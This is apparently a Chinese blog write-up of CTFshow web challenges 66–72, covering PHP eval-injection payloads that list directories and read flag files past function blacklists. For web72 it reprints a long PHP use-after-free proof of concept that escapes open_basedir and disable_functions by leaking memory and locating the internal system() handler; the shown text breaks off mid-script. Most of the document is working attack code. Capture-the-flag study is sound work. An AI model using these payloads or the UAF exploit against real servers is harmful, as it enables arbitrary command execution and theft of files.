<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:c=<span class="built_in">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
<p>show_source被禁用了</p>
<p>highlight_file可用但是<img src="/2022/03/11/CTFshow2/image-20220204151353485-164701005467513.png" alt="image-20220204151353485"></p>
<p>这个函数可以用，但是文件变了，查看目录结构</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">c</span>=<span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="string">&#x27;/&#x27;</span>));  发现是根目录下<span class="variable">flag.txt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>



<h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p><img src="/2022/03/11/CTFshow2/image-20220130152953552-164701005467511.png" alt="image-20220130152953552"></p>
<p>print_r被禁用了，换成 var_dump即可</p>
<p><strong>var_dump()</strong> 函数用于输出变量的相关信息，用于打印显示，一个变量的内容与结构，以及类型的信息。</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">c</span>=<span class="function"><span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&#x27;/&#x27;</span>)); </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>：<span class="variable">c</span>=<span class="title">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>



<h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p>显示highlight_file也被禁用了</p>
<p>文件显示的代码，比如show_source、highlight_file、file_get_contents等基本都被禁了，这里换成文件包含的即可，如include、require</p>
<p><em>include</em> 语句包含并运行指定文件。txt文件无法运行则直接输出</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">payload</span>: <span class="variable">c</span>=<span class="function"><span class="title">var_dump</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>



<h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>()、<span class="title">var_dump</span>()被禁用</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">var_export</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>

<h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">error_reporting</span>() 、 <span class="title">ini_set</span>()、 <span class="title">highlight_file</span>()、<span class="title">var_dump</span>()被禁用</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">var_export</span>(<span class="title">scandir</span>(<span class="string">&quot;/&quot;</span>));</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="variable">c</span>=<span class="title">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span></span><br></pre></td></tr></table></figure>



<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = ob_get_contents();<span class="regexp">//</span>得到缓冲区的数据。</span><br><span class="line"> ob_end_clean();<span class="regexp">//</span>会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。可以利用<span class="keyword">exit</span>();停止后面的程序</span><br><span class="line"></span><br><span class="line">payload:c=var_export(scandir(<span class="string">&quot;/&quot;</span>));<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&quot;/flag.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>



<h2 id="不懂web72"><a href="#不懂web72" class="headerlink" title="不懂web72"></a>不懂web72</h2><p><img src="/2022/03/11/CTFshow2/image-20220220152051961-164701005467512.png" alt="image-20220220152051961"></p>
<p><img src="/2022/03/11/CTFshow2/image-20220220152145730-164701005467514.png" alt="image-20220220152145730">说明没有flag.txt这个文件，也没法查看目录结构</p>
<p><strong>利用glob协议扫描目录</strong></p>
<p><img src="/2022/03/11/CTFshow2/image-20220220154514866-164701005467515.png" alt="image-20220220154514866"></p>
<p>通过这个发现flag在flag0.txt,之后利用uaf的脚本进行命令执行</p>
<p><code>/*</code>是根目录下所有文件</p>
<p>由于<code>open_basedir</code>的限制，还是不可以直接include进来，需要想其它的办法。使用UAF。脚本如下：记得要把<code>c=</code>之后的内容url编码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$backtrace</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line"><span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line"><span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line"><span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line"><span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line"><span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line"><span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line"><span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line"><span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line"><span class="variable">$p_type</span> = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line"><span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123;</span><br><span class="line"><span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line"><span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line"><span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line"><span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line"><span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"><span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line"><span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$contiguous</span> = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line"><span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line"><span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line"><span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 